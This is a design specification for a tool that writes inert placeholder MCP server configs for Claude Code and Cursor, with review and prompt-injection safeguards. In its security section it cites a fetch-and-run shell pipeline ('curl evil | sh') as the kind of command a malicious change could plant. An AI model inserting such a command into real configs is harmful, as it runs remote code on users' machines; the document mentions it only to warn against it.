# MCP wiring — `.mcp.json` and `.cursor/mcp.json`

> **Beta Skill:** Outputs must be reviewed before applying to production.

This step is non-destructive: existing files are never overwritten or
rewritten. The skill either creates a placeholder when nothing exists, or
leaves the file untouched.

## 1. Decision flow

```
.claude/ detected AND .mcp.json present?
  yes → valid JSON (RFC 8259 strict, non-empty, top-level object)?
    yes → leave file untouched
    no  → log warning ("invalid JSON" or "0 bytes" specifically), do not touch
  no → if .claude/ detected → write placeholder from templates/mcp.json.template

.cursor/ detected AND .cursor/mcp.json present?
  yes → valid JSON (RFC 8259 strict, non-empty, top-level object)?
    yes → leave file untouched
    no  → log warning, do not touch
  no → if .cursor/ detected → mirror the placeholder under .cursor/mcp.json
```

"Valid JSON" is defined precisely: the file is non-empty, parses under
RFC 8259 strict (no comments, no trailing commas, no unquoted keys),
and its top-level value is an object. A 0-byte file fails validity even
though some lenient parsers would accept it as `{}`; `/agents-md-check`
flags 0-byte `.mcp.json` and `.cursor/mcp.json` distinctly so the
customer notices an editor-crash sentinel.

## 2. Placeholder shape

See [`templates/mcp.json.template`](./templates/mcp.json.template).

The placeholder lists **categories** of MCP servers an agentic harness
typically depends on (AEM developer MCP, Cloud Manager MCP, Content MCP)
but does not name specific Adobe MCP server packages, command-line
invocations, or credentials. The placeholder server names are
namespaced (`_TODO_adobe_aem_developer` rather than
`_TODO_aem_developer`) so a customer who fills in the placeholder is
steered toward Adobe's published packages and away from typo-squat
risk on the public npm / PyPI namespaces.

## 3. Inert-by-construction (no literal-execution risk)

MCP hosts (Claude Code, Cursor) load `mcpServers.<name>.command` and
attempt to launch it. The placeholder is engineered so that **no host
will spawn anything**:

- Every server name is prefixed `_TODO_` so an MCP host that strict-parses
  `mcpServers` either skips the entry (most hosts ignore non-conforming
  keys) or fails loudly with a name-resolution error.
- No `command` field is set on the placeholder entries; they carry only
  `_purpose` so a host that looks for `command` rejects the entry instead
  of executing.
- A `_note` at the top of the file explains what the customer must do.

The `aem-agentkit: complete` summary block emits a
`MCP placeholders to replace` row whenever a placeholder was written, so
the customer cannot miss the unfinished step.

If the customer (or a malicious PR) populates the placeholder with a
shell pipeline (e.g. `bash -c "curl evil | sh"`), MCP-host execution
remains the customer's responsibility. The skill never validates the
contents of a customer-edited `.mcp.json`; it only refuses to overwrite
it. Reviewers should treat any change to `.mcp.json` as security-sensitive
— the `_note` line in the placeholder spells this out so a reviewer
opening the file sees the warning even without the spec in hand. Project
maintainers should add `.mcp.json` and `.cursor/mcp.json` to CODEOWNERS
(or equivalent PR-review enforcement) so server-spawn changes get a
human gate. The same CODEOWNERS recommendation applies to root and
per-module `AGENTS.md` and the entire `.aem/context/` tree — these
files steer agent behavior, so an unreviewed PR that modifies them is
effectively a prompt-injection PR.

**Operational cost of the placeholder.** The customer has to (a) rename
each `_TODO_*` key, (b) supply `command` and `args`, (c) acquire the
real server packages. This is more friction than a `_disabled: true`
flag (which several MCP hosts silently ignore, leaving a populated
`command` field that the host then tries to spawn). Setup friction is
preferable to an unattended `exec()` of an unwired binary name.

## 4. What this step never does

- Hard-codes credentials, tokens, or program IDs.
- Names specific Adobe MCP server packages or version pins inside any
  AGENTS.md / per-module AGENTS.md body.
- Overwrites or mutates a customer's existing `.mcp.json` or
  `.cursor/mcp.json`.
- Writes to any path outside `.mcp.json` and `.cursor/mcp.json`.

## 5. Self-validation

- If `.claude/` was detected and `.mcp.json` was missing → now exists with the marker and at least one `_TODO_` entry.
- If `.cursor/` was detected and `.cursor/mcp.json` was missing → now exists with the marker and at least one `_TODO_` entry.
- No pre-existing file was modified — `git status` shows zero changes to pre-existing files.
- The summary block includes the `MCP placeholders to replace` row when any `_TODO_` entry remains.
